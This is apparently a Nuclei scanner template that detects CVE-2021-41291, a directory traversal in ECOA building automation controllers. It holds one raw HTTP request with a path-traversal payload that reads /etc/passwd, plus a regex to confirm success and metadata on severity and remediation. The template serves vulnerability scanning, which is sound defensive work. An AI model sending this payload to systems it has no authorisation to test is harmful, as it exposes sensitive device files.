http:
- matchers:
  - regex:
    - 'root:.*:0:0:'
    type: regex
  raw:
  - 'GET /fmangersub?cpath=../../../../../../../etc/passwd HTTP/1.1

    Host: {{Hostname}}

    '
id: CVE-2021-41291
info:
  author: gy741
  classification:
    cpe: cpe:2.3:o:ecoa:ecs_router_controller-ecs_firmware:-:*:*:*:*:*:*:*
    cve-id: CVE-2021-41291
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
    epss-percentile: 0.99659
    epss-score: 0.9166
  description: The ECOA BAS controller suffers from a directory traversal content
    disclosure vulnerability. Using the GET parameter cpath in File Manager (fmangersub),
    attackers can disclose directory content on the affected device
  impact: 'An attacker can exploit this vulnerability to access sensitive files and
    directories, potentially exposing sensitive information.

    '
  metadata:
    max-request: 1
    product: ecs_router_controller-ecs_firmware
    vendor: ecoa
  name: ECOA Building Automation System - Directory Traversal Content Disclosure
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-41291
  - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5670.php
  - https://www.twcert.org.tw/en/cp-139-5140-6343c-2.html
  - https://www.twcert.org.tw/tw/cp-132-5127-3cbd3-1.html
  - https://github.com/ARPSyndicate/cvemon
  remediation: 'Apply the latest security patches or updates provided by the vendor
    to fix the directory traversal vulnerability in the ECOA Building Automation System.

    '
  severity: high
  tags: cve2021,cve,ecoa,lfi,traversal,vuln
